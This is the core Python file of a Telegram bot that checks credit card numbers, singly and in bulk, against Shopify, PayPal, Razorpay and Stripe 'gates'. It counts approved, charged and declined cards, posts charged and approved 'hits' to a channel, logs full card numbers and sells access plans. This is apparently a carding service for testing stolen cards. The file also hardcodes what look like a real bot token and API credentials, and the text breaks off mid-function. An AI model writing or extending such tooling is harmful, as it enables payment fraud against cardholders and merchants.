from telethon import TelegramClient, events, Button
from telethon.events import StopPropagation
from telethon.tl.types import KeyboardButtonCallback
from telethon.errors import FloodWaitError
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import requests, random, datetime, json, os, re, asyncio, time
import string, hashlib, aiohttp, aiofiles, sys, logging, io, zipfile, shutil, subprocess, unicodedata
from logging.handlers import RotatingFileHandler
from urllib.parse import urlparse
import ssl
import certifi
from razor_checker import check_razor_card
from paypal_checker import PAYPAL_SITE_FILE, check_paypal_card, check_paypal_site, load_paypal_sites
from stripe_checker import check_stripe_card

SSL_CONTEXT = ssl.create_default_context(cafile=certifi.where())

# --- UPDATES CHANNEL ---
UPDATES_CHANNEL_URL = "https://t.me/+rY3KTYI5ixc0NjE0"

# --- FEEDBACK CHANNEL ---
FEEDBACK_CHANNEL_ID = -1003931705303  # Set to your feedback channel ID (e.g., -1001234567890)
LOGS_CHANNEL_ID = -1003957269794  # Logs/hits channel ID. Charged/Approved hits are posted here.
LOGS_BOT_URL = "https://t.me/cctanjiroBot"  # Button in the logs channel links here

# --- PREMUM EMOJI SYSTEM ---
PREMIUM_EMOJI_IDS = {
    "✅": "5289967092265660622",
    "🔥": "5300779290181262152",
    "❌": "5280803324273115630",
    "⚡": "6026367225466720832",
    "💳": "5472250091332993630",
    "💠": "5971837723676249096",
    "📝": "5852614525370503272",
    "🌐": "6026367225466720832",
    "🎯": "5310278924616356636",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "6294134010893311584",
    "⚙️": "5341715473882955310",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "6023660820544623088",
    "🔄": "5231311454048636466",
    "⏳": "5971837723676249096",
    "🚀": "5195033767969839232",
    "⚠️": "5420323339723881652",
    "💎": "5767209624675553166",
    "💵": "5409048419211682843",   # price
    "🎁": "5427168083074628963",   # diamond
    "🔐": "5296369303661067030",   # 3ds
    "🆔": "5334815750655849990",  #id
    "👽": "5780484574018541306",  
    "👾": "5780465616032896255",
    "🧾": "5204242830687494041", #response
    "💱": "5402186569006210455", #gate
    "⌛": "5386367538735104399", #time
    "🙂": "5798532958604235302", #user
    "👑": "5816539591812845173", #author
    "💡": "5262844652964303985", #lamp
    "🪙": "5202064723922670546", #ethurium
    "🔴": "4990182601252668309", #red button
    "⁉️": "5314504236132747481", #question
    "🛠": "5462921117423384478", #tool
    "🎱": "5837071798935492251", #id2
    "🤕": "5463156928307801722", #hit
    }

WELCOME_GIFS = [
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZXhndXU1OG1nZ2plYnQwbjNoOGUxbWZpOHEybHc3dnhhNHdqZ213aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/K4o6w46oslJvVwMIVM/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZXhndXU1OG1nZ2plYnQwbjNoOGUxbWZpOHEybHc3dnhhNHdqZ213aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/R9TbpugxAhx9UnerhD/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Y04ZjFj6rmEljs8ErI/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZXhndXU1OG1nZ2plYnQwbjNoOGUxbWZpOHEybHc3dnhhNHdqZ213aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/yrEpeRHZFhj5eVjWDq/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QUKqSLmE7vmZP2PkZk/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/59IjtCaRAcQiaj19mU/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9w3kndMBbKDxxkg5sm/giphy.gif",
    "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9fvLAakbTxKwdAlUKO/giphy.gif",
]

# --- CUSTOM EMOJI FOR INLINE KEYBOARDS ---
CUSTOM_EMOJI = {
    "VERIFY": "5289967092265660622",
    "CROSS": "5280803324273115630",
    "THUMBS_UP": "1122334455667788990",
    "GATES": "5312441427764989435",
    "COMMANDS": "5341715473882955310",
    "BACK": "5280803324273115630",
    "TOOLS": "5341715473882955310",
    "HELP": "5314504236132747481",
    "ADMIN": "6294134010893311584",
    "UPDATE": "5386367538735104399",
    "REGISTER": "5852614525370503272",
    "SUCCESS": "5289967092265660622",
    "DANGER": "5280803324273115630",
    "PRIMARY": "5971837723676249096",
    "CLOSE": "5420323339723881652",
    "OWNER": "5816539591812845173",
}

def premium_emoji(text, mode="html"):
    if not text: return text
    if mode == "button":
        return text
    result = text
    result = re.sub(r'```(.*?)```', r'<blockquote>\1</blockquote>', result, flags=re.DOTALL)
    result = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', result, flags=re.DOTALL)
    result = re.sub(r'`([^`\n]+)`', r'<code>\1</code>', result)
    result = re.sub(r'\[([^\]]+)\]\((https?://[^)]+)\)', r'<a href="\2">\1</a>', result)
    if "<tg-emoji" in result:
        return result
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

def build_mass_progress_buttons(mode, approved, charged, declined, checked, total, stop_data):
    approved_btn = Button.inline(
        f"Approved: {approved}", b"n",
        style="success", icon=int(PREMIUM_EMOJI_IDS["🔥"])
    )
    declined_btn = Button.inline(
        f"Declined: {declined}", b"n",
        style="danger", icon=int(PREMIUM_EMOJI_IDS["❌"])
    )
    checked_btn = Button.inline(
        f"Checked: {checked}/{total}", b"n",
        style="primary", icon=int(PREMIUM_EMOJI_IDS["📊"])
    )
    stop_btn = Button.inline(
        "Stop Process", stop_data,
        style="danger", icon=int(PREMIUM_EMOJI_IDS["🛑"])
    )
    if mode == "auth":
        return [
            [approved_btn, declined_btn],
            [checked_btn, stop_btn],
        ]
    charged_btn = Button.inline(
        f"Charged: {charged}", b"n",
        style="primary", icon=int(PREMIUM_EMOJI_IDS["💰"])
    )
    return [
        [approved_btn, charged_btn],
        [declined_btn, checked_btn],
        [stop_btn],
    ]

def get_gate_gif(gate_name):
    """Get a random GIF for the gate"""
    gate_gifs = {
        "Shopify": [
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZXhndXU1OG1nZ2plYnQwbjNoOGUxbWZpOHEybHc3dnhhNHdqZ213aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/K4o6w46oslJvVwMIVM/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3ZXhndXU1OG1nZ2plYnQwbjNoOGUxbWZpOHEybHc3dnhhNHdqZ213aiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/R9TbpugxAhx9UnerhD/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Y04ZjFj6rmEljs8ErI/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/yrEpeRHZFhj5eVjWDq/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QUKqSLmE7vmZP2PkZk/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/59IjtCaRAcQiaj19mU/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9w3kndMBbKDxxkg5sm/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9fvLAakbTxKwdAlUKO/giphy.gif",
        ],
        "PayPal": [
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/Y04ZjFj6rmEljs8ErI/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/yrEpeRHZFhj5eVjWDq/giphy.gif",
        ],
        "Razorpay": [
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QUKqSLmE7vmZP2PkZk/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/59IjtCaRAcQiaj19mU/giphy.gif",
        ],
        "Stripe Auth": [
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9w3kndMBbKDxxkg5sm/giphy.gif",
            "https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3dWRwOHg3ZHh3NjVvcGpqcjNjeW12N2MzbDlqbzh5b3JzajlqeHZubSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/9fvLAakbTxKwdAlUKO/giphy.gif",
        ],
    }
    gifs = gate_gifs.get(gate_name, WELCOME_GIFS)
    return random.choice(gifs)

async def _safe_gif(gif_url):
    """Download a GIF URL to bytes so Telegram does not fetch it itself.
    Prevents WebpageMediaEmptyError. Returns a BytesIO on success or None
    (None makes Telethon send text-only instead of failing)."""
    if not gif_url:
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as _s:
            async with _s.get(gif_url) as _r:
                if _r.status == 200:
                    data = await _r.read()
                    if data:
                        bio = io.BytesIO(data)
                        bio.name = "gate.gif"
                        return bio
    except Exception:
        pass
    return None

def create_premium_gate_layout(status_icon, status_title, card, display_response, gate, brand, bin_type, level, bank, country, flag, user_id, user_name, elapsed_time, price=None):
    """Create unified premium gate layout with GIF support"""
    if price is not None and str(gate).lower().startswith("shopify"):
        price_val = price if price not in (None, "-", "") else "N/A"
        formatted_price = f"${price_val}" if not str(price_val).startswith('$') else str(price_val)
        gate_line = f"{premium_emoji('💱')} <b>𝗚𝗮𝘁𝗲 ⇾</b> <b>Shopify {formatted_price} {premium_emoji('💵')}</b>\n"
    else:
        gate_line = f"{premium_emoji('💱')} <b>𝗚𝗮𝘁𝗲 ⇾</b> <b>{gate}</b>\n"
    msg = (
        f"{premium_emoji(status_icon)} <b>{status_title}</b>\n\n"
        f"{premium_emoji('💳')} <b>𝗖𝗖 ⇾</b> <code>{card}</code>\n"
        f"{premium_emoji('🧾')} <b>𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ⇾</b> <b>{display_response}</b>\n"
        f"{gate_line}"
        f"<blockquote>"
        f"<code>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}</code>\n"
        f"<code>𝗕𝗮𝗻𝗸: {bank}</code>\n"
        f"<code>𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</code>"
        f"</blockquote>\n"
        f"{premium_emoji('🙂')} <b>𝐔𝐬𝐞𝐫</b> <b><a href='tg://user?id={user_id}'>{user_name}</a></b>\n"
        f"{premium_emoji('⌛')} <b>𝗧𝗼𝗼𝙠</b> <b>{elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀</b>\n"
        f"{premium_emoji('👑')} <b>𝘽𝙊𝙏 𝘽𝙔 <a href='tg://user?id={OWNER_ID}'>𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮</a></b>"
    )
    return msg

def get_buy_panel_text(reason_note: str = "", include_contact_link: bool = True) -> tuple:
    header_notice = ""
    if reason_note:
        header_notice = f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>{reason_note}</code>\n\n"
    text = (
        f"{header_notice}"
        f"{premium_emoji('🚀')} <b>𝖯𝖱𝖤𝖬𝖨𝖴𝖬 𝖠𝖢𝖢𝖤𝖲𝖲 𝖯𝖫𝖠𝖭𝖲</b> {premium_emoji('🚀')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🪙')} <b>𝗧𝗥𝗜𝗔𝗟 𝗣𝗟𝗔𝗡</b>\n"
        f"⇾ 𝖣𝖴𝖱𝖠𝖳𝖨𝖮𝖭 <b>::</b> <code>3 Days</code>\n"
        f"⇾ 𝖯𝖱𝖨𝖢𝖤 <b>::</b> <code>3$</code>\n"
        f"⇾ 𝖠𝖢𝖢𝖤𝖲𝖲 <b>::</b> Full Gates {premium_emoji('💡')}\n\n"
        f"{premium_emoji('🪙')} <b>𝗦𝗧𝗔𝗥𝗧𝗘𝗥 𝗣𝗟𝗔𝗡</b>\n"
        f"⇾ 𝖣𝖴𝖱𝖠𝖳𝖨𝖮𝖭 <b>::</b> <code>7 Days</code>\n"
        f"⇾ 𝖯𝖱𝖨𝖢𝖤 <b>::</b> <code>5$</code>\n"
        f"⇾ 𝖠𝖢𝖢𝖤𝖲𝖲 <b>::</b> Full Gates {premium_emoji('💡')}\n\n"
        f"{premium_emoji('🪙')} <b>𝗦𝗜𝗟𝗩𝗘𝗥 𝗣𝗟𝗔𝗡</b>\n"
        f"⇾ 𝖣𝖴𝖱𝖠𝖳𝖨𝖮𝖭 <b>::</b> <code>15 Days</code>\n"
        f"⇾ 𝖯𝖱𝖨𝖢𝖤 <b>::</b> <code>8$</code>\n"
        f"⇾ 𝖠𝖢𝖢𝖤𝖲𝖲 <b>::</b> Full Gates {premium_emoji('💡')}\n\n"
        f"{premium_emoji('🪙')} <b>𝗚𝗢𝗟𝗗 𝗣𝗟𝗔𝗡</b>\n"
        f"⇾ 𝖣𝖴𝖱𝖠𝖳𝖨𝖮𝖭 <b>::</b> <code>30 Days</code>\n"
        f"⇾ 𝖯𝖱𝖨𝖢𝖤 <b>::</b> <code>15$</code>\n"
        f"⇾ 𝖠𝖢𝖢𝖤𝖲𝖲 <b>::</b> Full Gates {premium_emoji('💡')}\n\n"
        f"{premium_emoji('🪙')} <b>𝗣𝗟𝗔𝗧𝗜𝗡𝗨𝗠 𝗣𝗟𝗔𝗡</b>\n"
        f"⇾ 𝖣𝖴𝖱𝖠𝖳𝖨𝖮𝖭 <b>::</b> <code>90 Days</code>\n"
        f"⇾ 𝖯𝖱𝖨𝖢𝖤 <b>::</b> <code>40$</code>\n"
        f"⇾ 𝖠𝖢𝖢𝖤𝖲𝖲 <b>::</b> Full Gates {premium_emoji('💡')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    return text, None

# --- CONFIGURATION ---
API_ID = 32325462
API_HASH = "394f87023e22704201fd26e756f92263"
BOT_TOKEN = "8046365679:AAGGVLnr2YPOkGMf88VGIC3zKUrd34v56kQ" # Replace with your Bot Token
OWNER_ID = 1603461441
ADMIN_IDS = [1603461441, 8601543305]
ADMIN_ID = ADMIN_IDS
ADMIN_FILE = "admins.json"
GROUP_ID = -1002553995177
MAINTENANCE_MODE = False
GATE_MAINTENANCE = set()
# Temporary state to store sites before price selection
# Temporary state to store sites before price selection
TEMP_EXTRACTED = {}

# Detailed process tracking
ACTIVE_PROCESSES = {} 
# Dictionary to store the actual running Task objects to kill them on Stop
RUNNING_TASKS = {}
# Dictionary to store lists of individual site-check tasks
PENDING_SUBTASKS = {}
BATCH_TASKS = {}
USER_BATCHES = {}
JSON_LOCKS = {}

# --- CONFIGURATION ---
DEBUG_MODE = True# Set to True to see logs in Terminal
LOG_FILE = "bot_log.txt"
MAX_LOG_SIZE = 50 * 1024 * 1024  # 50 MB

# --- LOGGING SETUP ---
logger = logging.getLogger("ShopifyBot")
logger.setLevel(logging.INFO)

# Formatter: [TIME] | [LEVEL] | [MESSAGE]
formatter = logging.Formatter('[%(asctime)s] | %(levelname)-8s | %(message)s', '%Y-%m-%d %H:%M:%S')

# File Handler (Always On)
file_handler = RotatingFileHandler(LOG_FILE, maxBytes=MAX_LOG_SIZE, backupCount=5, encoding='utf-8')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

# Console Handler (Conditional)
if DEBUG_MODE:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)

# Helper for formatted tagging
def log_info(tag, message):
    logger.info(f"{tag: <15} | {message}")

def log_error(tag, message):
    logger.error(f"{tag: <15} | {message}")

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    return user_id in ADMIN_IDS

async def load_admin_ids():
    global ADMIN_IDS, ADMIN_ID
    data = await load_json(ADMIN_FILE)
    file_ids = data.get("admin_ids", [])
    merged_ids = {OWNER_ID, *ADMIN_IDS}
    for admin_id in file_ids:
        try:
            merged_ids.add(int(admin_id))
        except:
            pass
    ADMIN_IDS = sorted(merged_ids)
    ADMIN_ID = ADMIN_IDS
    await save_json(ADMIN_FILE, {"admin_ids": ADMIN_IDS})

async def save_admin_ids():
    await save_json(ADMIN_FILE, {"admin_ids": ADMIN_IDS})

async def display_name_for_user(event):
    if is_owner(event.sender_id):
        return "OWNER"
    try:
        sender = await event.get_sender()
        return sender.first_name or f"user_{event.sender_id}"
    except:
        return f"user_{event.sender_id}"

def maintenance_notice_text():
    return premium_emoji("<b>System is currently under maintenance. Only the OWNER can access bot functions at this time.</b>")

async def send_maintenance_notice(event):
    await event.reply(maintenance_notice_text(), parse_mode='html')

GATE_COMMAND_GROUPS = {
    "rz": "razorpay",
    "mrz": "razorpay",
    "razor": "razorpay",
    "razorpay": "razorpay",
    "pp": "paypal",
    "mpp": "paypal",
    "paypal": "paypal",
    "sh": "shopify",
    "msh": "shopify",
    "shopify": "shopify",
    "chk": "stripe",
    "mchk": "stripe",
    "stripe": "stripe"
}

GATE_DISPLAY_NAMES = {
    "razorpay": "Razorpay",
    "paypal": "PayPal",
    "shopify": "Shopify",
    "stripe": "Stripe Auth"
}

def resolve_gate_name(name):
    return GATE_COMMAND_GROUPS.get(str(name or "").lower())

async def send_gate_maintenance_notice(event, gate):
    gate_name = GATE_DISPLAY_NAMES.get(gate, gate.title())
    await event.reply(premium_emoji(f"⚠️ <b>{gate_name} gate is currently under maintenance. Only the OWNER can use it at this time.</b>"), parse_mode='html')

async def notify_all_users(text):
    sent = set()
    for filename in [FREE_FILE, PREMIUM_FILE]:
        data = await load_json(filename)
        for user_id in data.keys():
            try:
                uid = int(user_id)
                if uid in sent:
                    continue
                await client.send_message(uid, premium_emoji(text), parse_mode='html')
                sent.add(uid)
            except:
                pass
    for admin_id in ADMIN_ID:
        try:
            if admin_id not in sent:
                await client.send_message(admin_id, premium_emoji(text), parse_mode='html')
                sent.add(admin_id)
        except:
            pass

def generate_batch_id():
    for _ in range(1000):
        batch_id = str(random.randint(1000, 9999))
        if batch_id not in BATCH_TASKS:
            return batch_id
    return str(int(time.time()) % 9000 + 1000)

def register_batch(user_id, task, label, user_name=None, gate=None):
    batch_id = generate_batch_id()
    gate_name = gate or GATE_DISPLAY_NAMES.get(resolve_gate_name(label), label.title())
    BATCH_TASKS[batch_id] = {"task": task, "user_id": user_id, "label": label, "gate": gate_name, "user_name": user_name or f"user_{user_id}", "created_at": time.time()}
    USER_BATCHES[user_id] = batch_id
    log_info("BATCH", f"Started batch {batch_id} for user {user_id} ({label})")
    return batch_id

def start_batch_task(user_id, coro, label, user_name=None, gate=None):
    task = asyncio.create_task(coro)
    batch_id = register_batch(user_id, task, label, user_name, gate)
    task.add_done_callback(lambda _task, bid=batch_id, uid=user_id: cleanup_batch(bid, uid))
    return task, batch_id

async def ensure_no_active_batch(event):
    batch_id = USER_BATCHES.get(event.sender_id)
    if not batch_id:
        return True
    batch = BATCH_TASKS.get(str(batch_id))
    gate = batch.get("gate", batch.get("label", "Unknown")) if batch else "Unknown"
    try:
        await event.reply(
            premium_emoji(
                f"⚠️ <b>You already have an active batch.</b>\n\n"
                f"🎱<b>Batch ID:</b> <code>{batch_id}</code>\n"
                f"𝗚𝗮𝘁𝗲𝙬𝗮𝘆 ⇾ <b>{gate}</b>\n\n"
                f"🛑 Stop it first before using another gate."
            ),
            parse_mode='html'
        )
    except Exception:
        await event.reply(
            f"You already have an active batch.\n\nBatch ID: {batch_id}\nGateway: {gate}\n\nStop it first before using another gate."
        )
    return False

def cleanup_batch(batch_id=None, user_id=None):
    if batch_id:
        BATCH_TASKS.pop(str(batch_id), None)
    if user_id:
        USER_BATCHES.pop(user_id, None)

async def cancel_batch(batch_id, reason):
    batch = BATCH_TASKS.pop(str(batch_id), None)
    if not batch:
        return False
    user_id = batch.get("user_id")
    task = batch.get("task")
    USER_BATCHES.pop(user_id, None)
    RUNNING_TASKS.pop(user_id, None)
    ACTIVE_PROCESSES.pop(user_id, None)
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)
    USER_PROCESS_STATUS[user_id] = "stopped"
    if user_id in PENDING_SUBTASKS:
        for subtask in PENDING_SUBTASKS[user_id]:
            if not subtask.done():
                subtask.cancel()
        PENDING_SUBTASKS.pop(user_id, None)
    if task and not task.done():
        task.cancel()
    log_info("BATCH", f"Cancelled batch {batch_id} for user {user_id}. Reason: {reason}")
    return True

async def kill_all_batches(reason):
    for batch_id in list(BATCH_TASKS.keys()):
        await cancel_batch(batch_id, reason)
    for user_id, task in list(RUNNING_TASKS.items()):
        if task and not task.done():
            task.cancel()
        RUNNING_TASKS.pop(user_id, None)
        USER_PROCESS_STATUS[user_id] = "stopped"
    for user_id, tasks in list(PENDING_SUBTASKS.items()):
        for task in tasks:
            if not task.done():
                task.cancel()
        PENDING_SUBTASKS.pop(user_id, None)
    ACTIVE_PROCESSES.clear()
    ACTIVE_MTXT_PROCESSES.clear()

async def owner_only_silent(event):
    return is_owner(event.sender_id)
    
def log_endpoint(endpoint, method, status, response_body, card="N/A", site="N/A"):
    """Logs full API interaction details including the CC number and target site"""
    try:
        # Clean up response body to remove newlines for better log readability
        clean_res = str(response_body).replace('\n', ' ').replace('\r', '')
        log_msg = f"DEBUG_LOG | {method} | SITE: {site} | CC: {card} | HTTP: {status} | DATA: {clean_res} | URL: {endpoint}"
        logger.info(log_msg)
    except Exception as e:
        print(f"Logging Error: {e}")
        
def extract_and_clean_urls(text):
    """Finds URLs and strips code junk (quotes, commas, brackets, etc.)"""
    # Regex to find URLs and bare domains
    pattern = r'(?:https?://)?(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/[^\s"\'\[\],<>\(\)]*)?'
    raw_urls = re.findall(pattern, text)
    
    cleaned_urls = []
    for url in raw_urls:
        # Strip trailing punctuation often caught by regex
        clean_url = url.strip().rstrip('.;,)]}/')
        if clean_url:
            cleaned_urls.append(clean_url)
    
    return list(set(cleaned_urls)) # Deduplicate

def get_site_url(site):
    if isinstance(site, dict):
        return site.get('url', '')
    return str(site or '')

def site_dedupe_key(site):
    url = get_site_url(site).strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = f'https://{url}'
    try:
        parsed = urlparse(url)
        host = parsed.netloc.lower().removeprefix('www.')
        path = parsed.path.rstrip('/')
        return f"{host}{path}"
    except:
        return url.lower().rstrip('/')

def dedupe_sites(sites):
    seen = set()
    unique = []
    for site in sites:
        key = site_dedupe_key(site)
        if key and key not in seen:
            seen.add(key)
            unique.append(site)
    return unique

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"
REGISTRATION_DB = "registration_db.json"
MAX_RETRY_ATTEMPTS = 5
BUG_SITE_CHARGE_THRESHOLD = 3
BOT_DIR = os.path.dirname(os.path.abspath(__file__))
REBOOT_FLAG_FILE = os.path.join(BOT_DIR, "reboot_flag.txt")

def trigger_hard_reboot():
    """Terminate immediately so the BAT wrapper can restart python bot.py."""
    os._exit(0)

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}
TEMP_EXTRACTED = {}
USER_PROCESS_STATUS = {} # Tracks "running" or "stopped"

def get_progress_bar(current, total):
    """Generates a visual progress bar"""
    size = 10
    filled = int(size * current / total)
    bar = "█" * filled + "░" * (size - filled)
    percent = int(100 * current / total)
    return f"[{bar}] {percent}%"

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE, ADMIN_FILE, REGISTRATION_DB]:
        await create_json_file(file)

def get_json_lock(filename):
    filename = os.path.abspath(filename)
    if filename not in JSON_LOCKS:
        JSON_LOCKS[filename] = asyncio.Lock()
    return JSON_LOCKS[filename]

async def load_json(filename):
    async with get_json_lock(filename):
        try:
            if not os.path.exists(filename):
                await create_json_file(filename)
            async with aiofiles.open(filename, "r", encoding="utf-8") as f:
                content = await f.read()
            if not content.strip():
                return {}
            return json.loads(content)
        except json.JSONDecodeError as e:
            print(f"Error loading {filename}: {str(e)}")
            try:
                obj, idx = json.JSONDecoder().raw_decode(content)
                trailing = content[idx:].strip()
                if isinstance(obj, dict) and trailing:
                    backup_file = f"{filename}.corrupt_{int(time.time())}.bak"
                    async with aiofiles.open(backup_file, "w", encoding="utf-8") as f:
                        await f.write(content)
                    tmp_filename = f"{filename}.tmp"
                    async with aiofiles.open(tmp_filename, "w", encoding="utf-8") as f:
                        await f.write(json.dumps(obj, indent=4))
                    os.replace(tmp_filename, filename)
                    print(f"Recovered {filename}; corrupt copy saved to {backup_file}")
                    return obj
            except Exception as recovery_error:
                print(f"Error recovering {filename}: {str(recovery_error)}")
            return {}
        except Exception as e:
            print(f"Error loading {filename}: {str(e)}")
            return {}

async def save_json(filename, data):
    async with get_json_lock(filename):
        try:
            tmp_filename = f"{filename}.tmp"
            async with aiofiles.open(tmp_filename, "w") as f:
                await f.write(json.dumps(data, indent=4))
            os.replace(tmp_filename, filename)
        except Exception as e:
            print(f"Error saving {filename}: {str(e)}")

def normalize_retry_reason(reason):
    clean = str(reason or "Unknown Error").replace('\n', ' ').replace('\r', ' ').strip()
    return clean[:250] if clean else "Unknown Error"

def public_final_response(result):
    status = str(result.get("Status", "")).lower()
    response = str(result.get("Response", ""))
    if status == "maxed out" or "retry maxed out" in response.lower():
        return "⚠️ Retry Maxed Out (5/5)"
    if any(k in response.lower() or k in status for k in ["charged", "order_paid", "order completed", "order_placed", "thank you", "successful", "💎"]):
        return "ORDER_PLACED"
    if "insufficient_funds" in response.lower():
        return "✅ Card Approved"
    return "❌ Card Declined"

def report_safe_response(result):
    status = str(result.get("Status", "")).lower()
    response = str(result.get("Response", ""))
    if status == "maxed out" or "retry maxed out" in response.lower():
        return "Retry Maxed Out"
    return response

def is_3ds_required_response(response):
    response_lower = str(response or "").lower()
    return "3ds_required" in response_lower or "3ds_authentication" in response_lower

def safe_bin_value(value):
    value = str(value or "-").strip()
    return value if value and value.lower() != "none" else "-"

def is_maxed_out_result(result):
    status = str(result.get("Status", "")).lower()
    response = str(result.get("Response", "")).lower()
    return status == "maxed out" or "retry maxed out" in response

def is_error_result(result):
    response = str(result.get("Response", ""))
